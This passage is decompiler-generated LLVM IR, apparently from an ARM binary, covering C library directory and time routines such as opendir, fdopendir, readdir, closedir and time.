  %v1_11218 = urem i32 %v3_11214, 2
  %v2_11218 = icmp eq i32 %v1_11218, 0
  br i1 %v2_11218, label %dec_label_pc_11238, label %dec_label_pc_11220

dec_label_pc_11220:                               ; preds = %dec_label_pc_11208, %dec_label_pc_11214
  %v2_11220 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_11220 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_11238

dec_label_pc_11238:                               ; preds = %dec_label_pc_11214, %entry, %dec_label_pc_11220
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_1126c, label %dec_label_pc_11254

dec_label_pc_11254:                               ; preds = %dec_label_pc_11238
  %v1_11258 = sub i32 0, %arg1
  %v3_1125c = load i16, i16* @global_var_21d68.334, align 2
  %v4_1125c = sext i16 %v3_1125c to i32
  %v0_11260 = call i32 @__aeabi_read_tp()
  %v3_11264 = add i32 %v4_1125c, %v0_11260
  %v4_11264 = inttoptr i32 %v3_11264 to i32*
  store i32 %v1_11258, i32* %v4_11264, align 4
  br label %dec_label_pc_1126c

dec_label_pc_1126c:                               ; preds = %dec_label_pc_11238, %dec_label_pc_11254
  %v1_11274 = phi i32 [ %arg1, %dec_label_pc_11238 ], [ -1, %dec_label_pc_11254 ]
  ret i32 %v1_11274

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1126c, { 1, 0 }
  uselistorder label %dec_label_pc_11238, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11220, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_11280 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_11290 = call i32 @gettimeofday(i32 %v2_11280, i32 0)
  %v2_11294 = load i32, i32* %stack_var_-16, align 4
  %v2_11298 = icmp eq i32* %arg1, null
  br i1 %v2_11298, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_11294, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_11294

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_112ac = load i32, i32* @r4, align 4
  store i32 %v3_112ac, i32* %stack_var_-24, align 4
  %v9_112ac = load i32, i32* @r6, align 4
  %v12_112ac = load i32, i32* @r7, align 4
  %v15_112ac = load i32, i32* @r8, align 4
  %v18_112ac = load i32, i32* @lr, align 4
  %v2_112b0 = load i32, i32* %arg1, align 4
  store i32 %v2_112b0, i32* %r3.global-to-local, align 4
  %v3_112b8 = icmp eq i32 %v2_112b0, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r6, align 4
  br i1 %v3_112b8, label %dec_label_pc_112cc, label %dec_label_pc_112e8

dec_label_pc_112cc:                               ; preds = %entry
  store i32 68236, i32* %r2.global-to-local, align 4
  %v0_112d0 = call i32 @__aeabi_read_tp()
  %v3_112d4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_112d4 = sext i16 %v3_112d4 to i32
  store i32 %v4_112d4, i32* %r2.global-to-local, align 4
  %v0_112d8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_112d8, i32* %r1.global-to-local, align 4
  %v1_112dc = add i32 %v0_112d8, 10
  store i32 %v1_112dc, i32* %r3.global-to-local, align 4
  %v3_112e0 = add i32 %v4_112d4, %v0_112d0
  %v4_112e0 = inttoptr i32 %v3_112e0 to i32*
  store i32 %v1_112dc, i32* %v4_112e0, align 4
  %v0_11390.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11390

dec_label_pc_112e8:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_112ec = add i32 %tmp, 24
  store i32 %v1_112ec, i32* %r2.global-to-local, align 4
  %v4_112f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 68) to i32*), align 4
  store i32 %v4_112f4, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_11300 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11300)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11318 = load i32, i32* @r6, align 4
  %v2_11318 = add i32 %v0_11318, 16
  %v3_11318 = inttoptr i32 %v2_11318 to i32*
  %v4_11318 = load i32, i32* %v3_11318, align 4
  call void @__pseudo_branch(i32 %v4_11318)
  %v0_11324 = load i32, i32* @r7, align 4
  %v1_11324 = inttoptr i32 %v0_11324 to i32*
  %v2_11324 = load i32, i32* %v1_11324, align 4
  store i32 %v2_11324, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_11334 = load i32, i32* @r8, align 4
  store i32 %v0_11334, i32* %v1_11324, align 4
  %v0_11338 = load i32, i32* @r6, align 4
  %v1_11338 = load i32, i32* %r3.global-to-local, align 4
  %v2_11338 = add i32 %v1_11338, %v0_11338
  %v3_11338 = inttoptr i32 %v2_11338 to i32*
  %v4_11338 = load i32, i32* %v3_11338, align 4
  store i32 ptrtoint (i32* @global_var_11344.360 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11338)
  %v0_11344 = load i32, i32* @r7, align 4
  %v1_11344 = add i32 %v0_11344, 12
  %v2_11344 = inttoptr i32 %v1_11344 to i32*
  %v3_11344 = load i32, i32* %v2_11344, align 4
  store i32 %v3_11344, i32* @r0, align 4
  %v0_11348 = call i32 @free()
  %v0_1134c = load i32, i32* @r7, align 4
  store i32 %v0_1134c, i32* @r0, align 4
  %v0_11350 = call i32 @free()
  %v0_11358 = load i32, i32* @r4, align 4
  store i32 %v0_11358, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_11358, -4095
  br i1 %tmp11, label %dec_label_pc_1138c, label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %dec_label_pc_112e8
  store i32 68068, i32* %r3.global-to-local, align 4
  %v0_11378 = call i32 @__aeabi_read_tp()
  %v3_1137c = load i16, i16* @global_var_21d68.334, align 2
  %v4_1137c = sext i16 %v3_1137c to i32
  store i32 %v4_1137c, i32* %r3.global-to-local, align 4
  %v0_11380 = load i32, i32* %r2.global-to-local, align 4
  %v1_11380 = sub i32 0, %v0_11380
  store i32 %v1_11380, i32* %r2.global-to-local, align 4
  %v3_11384 = add i32 %v4_1137c, %v0_11378
  %v4_11384 = inttoptr i32 %v3_11384 to i32*
  store i32 %v1_11380, i32* %v4_11384, align 4
  %v0_11388 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1138c

dec_label_pc_1138c:                               ; preds = %dec_label_pc_112e8, %dec_label_pc_11374
  %v0_1138c = phi i32 [ %v0_11358, %dec_label_pc_112e8 ], [ %v0_11388, %dec_label_pc_11374 ]
  store i32 %v0_1138c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11390

dec_label_pc_11390:                               ; preds = %dec_label_pc_112cc, %dec_label_pc_1138c
  %v0_11390 = phi i32 [ %v0_11390.pre, %dec_label_pc_112cc ], [ %v0_1138c, %dec_label_pc_1138c ]
  %v2_11398 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11398, i32* @r4, align 4
  store i32 %v9_112ac, i32* @r6, align 4
  store i32 %v12_112ac, i32* @r7, align 4
  store i32 %v15_112ac, i32* @r8, align 4
  store i32 %v18_112ac, i32* @lr, align 4
  ret i32 %v0_11390

; uselistorder directives
  uselistorder i32 %v0_11358, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11390, { 1, 0 }
  uselistorder label %dec_label_pc_1138c, { 1, 0 }
}

define i32 @function_113a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_113a8:
  %v0_113a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_113a8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_113a8
  %v2_113a8 = load i32, i32* @r4, align 4
  %v3_113b8 = udiv i32 %v2_113a8, 524288
  %v4_113b8 = mul i32 %v2_113a8, 8192
  %v5_113b8 = or i32 %v3_113b8, %v4_113b8
  %v8_113b8 = and i32 %v5_113b8, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_113a8, %bb
  %v9_113b8 = phi i32 [ %arg1, %dec_label_pc_113a8 ], [ %v8_113b8, %bb ]
  ret i32 %v9_113b8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_113bc = load i32, i32* @r4, align 4
  %v6_113bc = load i32, i32* @r5, align 4
  %v9_113bc = load i32, i32* @r6, align 4
  %v12_113bc = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_113d0 = call i32 @malloc()
  %v2_113d8 = icmp eq i32 %v0_113d0, 0
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r6, align 4
  br i1 %v2_113d8, label %bb, label %dec_label_pc_113e8

bb:                                               ; preds = %entry
  br label %dec_label_pc_11474

dec_label_pc_113e8:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_113ec = load i32, i32* @r4, align 4
  %v2_113ec = icmp ugt i32 %v0_113ec, 511
  %v2_113f0 = add i32 %v0_113d0, 4
  %v3_113f0 = inttoptr i32 %v2_113f0 to i32*
  store i32 0, i32* %v3_113f0, align 4
  %v0_113f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_113f4 = add i32 %v0_113d0, 16
  %v3_113f4 = inttoptr i32 %v2_113f4 to i32*
  store i32 %v0_113f4, i32* %v3_113f4, align 4
  %v0_113f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_113f8 = add i32 %v0_113d0, 8
  %v3_113f8 = inttoptr i32 %v2_113f8 to i32*
  store i32 %v0_113f8, i32* %v3_113f8, align 4
  br i1 %v2_113ec, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_113e8
  %v0_114002 = load i32, i32* @r4, align 4
  %v2_114003 = add i32 %v0_113d0, 20
  %v3_114004 = inttoptr i32 %v2_114003 to i32*
  store i32 %v0_114002, i32* %v3_114004, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_113e8
  %v1_113fc = load i32, i32* %r3.global-to-local, align 4
  %v2_113fc = add i32 %v1_113fc, 512
  store i32 %v2_113fc, i32* %r3.global-to-local, align 4
  %v0_11400 = load i32, i32* @r4, align 4
  %v2_11400 = add i32 %v0_113d0, 20
  %v3_11400 = inttoptr i32 %v2_11400 to i32*
  store i32 %v0_11400, i32* %v3_11400, align 4
  %v1_11404 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_11404, i32* %v3_11400, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_113d0, i32* @r5, align 4
  %v0_1140c = load i32, i32* @r7, align 4
  %v2_1140c = inttoptr i32 %v0_113d0 to i32*
  store i32 %v0_1140c, i32* %v2_1140c, align 4
  %v0_11410 = load i32, i32* @r5, align 4
  %v1_11410 = add i32 %v0_11410, 20
  %v2_11410 = inttoptr i32 %v1_11410 to i32*
  %v3_11410 = load i32, i32* %v2_11410, align 4
  store i32 %v3_11410, i32* %r1.global-to-local, align 4
  %v2_11418 = call i32 @calloc(i32 1, i32 %v3_11410)
  %v2_1141c = icmp eq i32 %v2_11418, 0
  store i32 %v2_11418, i32* @r4, align 4
  %v1_11424 = load i32, i32* @r5, align 4
  %v2_11424 = add i32 %v1_11424, 12
  %v3_11424 = inttoptr i32 %v2_11424 to i32*
  store i32 %v2_11418, i32* %v3_11424, align 4
  br i1 %v2_1141c, label %dec_label_pc_1142c, label %dec_label_pc_1143c

dec_label_pc_1142c:                               ; preds = %bb17
  %v0_1142c = load i32, i32* @r5, align 4
  store i32 %v0_1142c, i32* @r0, align 4
  %v0_11430 = call i32 @free()
  %v0_11434 = load i32, i32* @r4, align 4
  br label %dec_label_pc_11474

dec_label_pc_1143c:                               ; preds = %bb17
  %v0_11440 = load i32, i32* @r6, align 4
  %v2_11440 = add i32 %v0_11440, -34036
  store i32 %v2_11440, i32* %r3.global-to-local, align 4
  %v1_11448 = inttoptr i32 %v2_11440 to i32*
  %v2_11448 = load i32, i32* %v1_11448, align 4
  %v3_11448 = add i32 %v0_11440, -34032
  %v4_11448 = inttoptr i32 %v3_11448 to i32*
  %v5_11448 = load i32, i32* %v4_11448, align 4
  store i32 %v5_11448, i32* %r1.global-to-local, align 4
  %v6_11448 = add i32 %v0_11440, -34028
  %v7_11448 = inttoptr i32 %v6_11448 to i32*
  %v8_11448 = load i32, i32* %v7_11448, align 4
  store i32 %v8_11448, i32* %r2.global-to-local, align 4
  %v9_11448 = add i32 %v0_11440, -34024
  %v10_11448 = inttoptr i32 %v9_11448 to i32*
  %v11_11448 = load i32, i32* %v10_11448, align 4
  store i32 %v11_11448, i32* %r3.global-to-local, align 4
  %v12_11448 = add i32 %v0_11440, -34020
  %v1_11454 = inttoptr i32 %v12_11448 to i32*
  %v2_11454 = load i32, i32* %v1_11454, align 4
  %v3_11454 = add i32 %v0_11440, -34016
  %v4_11454 = inttoptr i32 %v3_11454 to i32*
  %v5_11454 = load i32, i32* %v4_11454, align 4
  store i32 %v2_11454, i32* %stack_var_-32, align 4
  store i32 %v5_11448, i32* %r1.global-to-local, align 4
  store i32 %v8_11448, i32* %r2.global-to-local, align 4
  store i32 %v11_11448, i32* %r3.global-to-local, align 4
  %v0_11464 = load i32, i32* @r5, align 4
  %v1_11464 = add i32 %v0_11464, 24
  %v1_11468 = inttoptr i32 %v1_11464 to i32*
  store i32 %v2_11448, i32* %v1_11468, align 4
  %v3_11468 = add i32 %v0_11464, 28
  %v4_11468 = inttoptr i32 %v3_11468 to i32*
  %v5_11468 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11468, i32* %v4_11468, align 4
  %v6_11468 = add i32 %v0_11464, 32
  %v7_11468 = inttoptr i32 %v6_11468 to i32*
  %v8_11468 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_11468, i32* %v7_11468, align 4
  %v9_11468 = add i32 %v0_11464, 36
  %v10_11468 = inttoptr i32 %v9_11468 to i32*
  %v11_11468 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_11468, i32* %v10_11468, align 4
  %v12_11468 = add i32 %v0_11464, 40
  %v2_1146c = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_11454, i32* %r1.global-to-local, align 4
  %v1_11470 = inttoptr i32 %v12_11468 to i32*
  store i32 %v2_1146c, i32* %v1_11470, align 4
  %v3_11470 = add i32 %v0_11464, 44
  %v4_11470 = inttoptr i32 %v3_11470 to i32*
  %v5_11470 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11470, i32* %v4_11470, align 4
  %v0_11474.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11474

dec_label_pc_11474:                               ; preds = %bb, %dec_label_pc_1142c, %dec_label_pc_1143c
  %v0_11474 = phi i32 [ 0, %bb ], [ %v0_11434, %dec_label_pc_1142c ], [ %v0_11474.pre, %dec_label_pc_1143c ]
  store i32 %v3_113bc, i32* @r4, align 4
  store i32 %v6_113bc, i32* @r5, align 4
  store i32 %v9_113bc, i32* @r6, align 4
  store i32 %v12_113bc, i32* @r7, align 4
  ret i32 %v0_11474

; uselistorder directives
  uselistorder i32 %v2_11418, { 1, 0, 2 }
  uselistorder i32 %v0_113d0, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 7, 4, 0, 1, 8, 5, 9, 6, 10, 2, 11, 3, 12 }
  uselistorder label %dec_label_pc_11474, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_1148c = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_11494 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_114c4, label %dec_label_pc_114ac

dec_label_pc_114ac:                               ; preds = %entry
  %v0_114b0 = call i32 @__aeabi_read_tp()
  %v3_114b4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_114b4 = sext i16 %v3_114b4 to i32
  %v0_114b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_114b8 = sub i32 0, %v0_114b8
  store i32 %v1_114b8, i32* %r2.global-to-local, align 4
  %v3_114bc = add i32 %v4_114b4, %v0_114b0
  %v4_114bc = inttoptr i32 %v3_114bc to i32*
  store i32 %v1_114b8, i32* %v4_114bc, align 4
  br label %dec_label_pc_114e8

dec_label_pc_114c4:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_114c4 = icmp slt i32 %arg1, 0
  br i1 %v1_114c4, label %dec_label_pc_114e8, label %dec_label_pc_114cc

dec_label_pc_114cc:                               ; preds = %dec_label_pc_114c4
  store i32 %v2_11494, i32* @r1, align 4
  %v0_114d0 = call i32 @fstat()
  %v1_114d4 = icmp slt i32 %v0_114d0, 0
  br i1 %v1_114d4, label %dec_label_pc_114dc, label %dec_label_pc_114f0

dec_label_pc_114dc:                               ; preds = %dec_label_pc_114cc
  br label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %dec_label_pc_114dc, %dec_label_pc_114c4, %dec_label_pc_114ac
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11534

dec_label_pc_114f0:                               ; preds = %dec_label_pc_114cc
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_114f8 = load i32, i32* @r7, align 4
  %v3_114fc = call i32 @__GI___fcntl_nocancel(i32 %v0_114f8, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11504 = load i32, i32* @r7, align 4
  %v2_11508 = call i32 @fd_to_DIR(i32 %v0_11504, i32 %tmp)
  store i32 %v2_11508, i32* %r1.global-to-local, align 4
  %v2_1150c = icmp eq i32 %v2_11508, 0
  br i1 %v2_1150c, label %dec_label_pc_11514, label %dec_label_pc_11534

dec_label_pc_11514:                               ; preds = %dec_label_pc_114f0
  %v0_11524 = call i32 @__aeabi_read_tp()
  %v3_11528 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11528 = sext i16 %v3_11528 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_11530 = add i32 %v4_11528, %v0_11524
  %v4_11530 = inttoptr i32 %v3_11530 to i32*
  store i32 12, i32* %v4_11530, align 4
  %v0_11534.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11534

dec_label_pc_11534:                               ; preds = %dec_label_pc_114f0, %dec_label_pc_114e8, %dec_label_pc_11514
  %v0_11534 = phi i32 [ %v2_11508, %dec_label_pc_114f0 ], [ 0, %dec_label_pc_114e8 ], [ %v0_11534.pre, %dec_label_pc_11514 ]
  store i32 %v3_1148c, i32* @r7, align 4
  ret i32 %v0_11534

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_11534, { 2, 0, 1 }
}

define i32 @"$d.11"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11544:
  %v0_11544 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11544, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11544
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11544, %bb
  %v10_1154c = phi i32 [ %arg1, %dec_label_pc_11544 ], [ 0, %bb ]
  ret i32 %v10_1154c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_11554 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_11554, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11560 = call i32 @fstat()
  store i32 %v0_11560, i32* @r5, align 4
  %v2_11564 = icmp eq i32 %v0_11560, 0
  br i1 %v2_11564, label %dec_label_pc_1156c, label %dec_label_pc_115e4

dec_label_pc_1156c:                               ; preds = %entry
  %v1_11570 = and i32 %tmp4, 61440
  store i32 %v1_11570, i32* @r3, align 4
  %v7_11574 = icmp eq i32 %v1_11570, 16384
  br i1 %v7_11574, label %dec_label_pc_11594, label %dec_label_pc_1157c

dec_label_pc_1157c:                               ; preds = %dec_label_pc_1156c
  %v0_11580 = call i32 @__aeabi_read_tp()
  %v3_11584 = load i16, i16* @global_var_21d68.334, align 2
  %v0_11588 = load i32, i32* @r5, align 4
  store i32 %v0_11588, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_115c8

dec_label_pc_11594:                               ; preds = %dec_label_pc_1156c
  %v0_11594 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1159c = call i32 @__libc_fcntl(i32 %v0_11594, i32 3)
  %v7_115a0 = icmp eq i32 %v2_1159c, -1
  br i1 %v7_115a0, label %dec_label_pc_115e4, label %dec_label_pc_115a8

dec_label_pc_115a8:                               ; preds = %dec_label_pc_11594
  %v1_115a8 = urem i32 %v2_1159c, 4
  store i32 %v1_115a8, i32* %r3.global-to-local, align 4
  %v7_115ac = icmp eq i32 %v1_115a8, 1
  br i1 %v7_115ac, label %dec_label_pc_115b4, label %dec_label_pc_115d0

dec_label_pc_115b4:                               ; preds = %dec_label_pc_115a8
  %v0_115b8 = call i32 @__aeabi_read_tp()
  %v3_115bc = load i16, i16* @global_var_21d68.334, align 2
  %v0_115c0 = load i32, i32* @r5, align 4
  store i32 %v0_115c0, i32* %r1.global-to-local, align 4
  %v0_115c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_115c4 = add i32 %v0_115c4, 21
  br label %dec_label_pc_115c8

dec_label_pc_115c8:                               ; preds = %dec_label_pc_1157c, %dec_label_pc_115b4
  %v2_115c8.in = phi i16 [ %v3_11584, %dec_label_pc_1157c ], [ %v3_115bc, %dec_label_pc_115b4 ]
  %v1_115c8 = phi i32 [ %v0_11580, %dec_label_pc_1157c ], [ %v0_115b8, %dec_label_pc_115b4 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_1157c ], [ %v1_115c4, %dec_label_pc_115b4 ]
  %v2_115c8 = sext i16 %v2_115c8.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_115c8 = add i32 %v1_115c8, %v2_115c8
  %v4_115c8 = inttoptr i32 %v3_115c8 to i32*
  store i32 %storemerge, i32* %v4_115c8, align 4
  %v0_115e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_115e8

dec_label_pc_115d0:                               ; preds = %dec_label_pc_115a8
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_115d4 = load i32, i32* @r4, align 4
  %v2_115d8 = call i32 @fd_to_DIR(i32 %v0_115d4, i32 %tmp)
  store i32 %v2_115d8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_115e8

dec_label_pc_115e4:                               ; preds = %entry, %dec_label_pc_11594
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_115e8

dec_label_pc_115e8:                               ; preds = %dec_label_pc_115d0, %dec_label_pc_115c8, %dec_label_pc_115e4
  %v0_115e8 = phi i32 [ %v2_115d8, %dec_label_pc_115d0 ], [ %v0_115e8.pre, %dec_label_pc_115c8 ], [ 0, %dec_label_pc_115e4 ]
  ret i32 %v0_115e8

; uselistorder directives
  uselistorder i32 %v1_115a8, { 1, 0 }
  uselistorder i32 %v2_1159c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 8, 5, 1, 2, 3, 4 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_115e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115e4, { 1, 0 }
  uselistorder label %dec_label_pc_115c8, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11600 = load i32, i32* @r4, align 4
  %v6_11600 = load i32, i32* @r5, align 4
  %v9_11600 = load i32, i32* @r6, align 4
  %v12_11600 = load i32, i32* @r7, align 4
  %v15_11600 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r6, align 4
  %v1_11614 = add i32 %tmp, 24
  store i32 %v1_11614, i32* @r4, align 4
  %v4_11618 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 68) to i32*), align 4
  store i32 %v4_11618, i32* %r1.global-to-local, align 4
  store i32 %v1_11614, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_1162c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1162c)
  %v0_11640 = load i32, i32* @r6, align 4
  %v2_11640 = add i32 %v0_11640, 16
  %v3_11640 = inttoptr i32 %v2_11640 to i32*
  %v4_11640 = load i32, i32* %v3_11640, align 4
  store i32 %v4_11640, i32* @ip, align 4
  store i32 71244, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11640)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_11650

dec_label_pc_11650:                               ; preds = %dec_label_pc_11680, %entry
  %v0_11650 = load i32, i32* @r5, align 4
  %v1_11650 = add i32 %v0_11650, 4
  %v2_11650 = inttoptr i32 %v1_11650 to i32*
  %v3_11650 = load i32, i32* %v2_11650, align 4
  store i32 %v3_11650, i32* %r2.global-to-local, align 4
  %v4_11650 = add i32 %v0_11650, 8
  %v5_11650 = inttoptr i32 %v4_11650 to i32*
  %v6_11650 = load i32, i32* %v5_11650, align 4
  %tmp10 = icmp ugt i32 %v6_11650, %v3_11650
  br i1 %tmp10, label %dec_label_pc_11680, label %dec_label_pc_1165c

dec_label_pc_1165c:                               ; preds = %dec_label_pc_11650
  %v1_1165c = inttoptr i32 %v0_11650 to i32*
  %v2_1165c = load i32, i32* %v1_1165c, align 4
  %v1_11660 = add i32 %v0_11650, 12
  %v2_11660 = inttoptr i32 %v1_11660 to i32*
  %v3_11660 = load i32, i32* %v2_11660, align 4
  store i32 %v3_11660, i32* %r1.global-to-local, align 4
  %v1_11664 = add i32 %v0_11650, 20
  %v2_11664 = inttoptr i32 %v1_11664 to i32*
  %v3_11664 = load i32, i32* %v2_11664, align 4
  store i32 %v3_11664, i32* %r2.global-to-local, align 4
  %v4_11668 = call i32 @__getdents(i32 %v2_1165c, i32 %v3_11660, i32 %v3_11664, i32 %v6_11650)
  %tmp9 = icmp slt i32 %v4_11668, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_11678

.thread:                                          ; preds = %dec_label_pc_1165c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_116ac

dec_label_pc_11678:                               ; preds = %dec_label_pc_1165c
  %v1_11678 = load i32, i32* @r5, align 4
  %v2_11678 = add i32 %v1_11678, 8
  %v3_11678 = inttoptr i32 %v2_11678 to i32*
  store i32 %v4_11668, i32* %v3_11678, align 4
  %v0_1167c = load i32, i32* @r7, align 4
  %v1_1167c = load i32, i32* @r5, align 4
  %v2_1167c = add i32 %v1_1167c, 4
  %v3_1167c = inttoptr i32 %v2_1167c to i32*
  store i32 %v0_1167c, i32* %v3_1167c, align 4
  %v0_11680.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11680

dec_label_pc_11680:                               ; preds = %dec_label_pc_11650, %dec_label_pc_11678
  %v1_11690 = phi i32 [ %v0_11650, %dec_label_pc_11650 ], [ %v0_11680.pre, %dec_label_pc_11678 ]
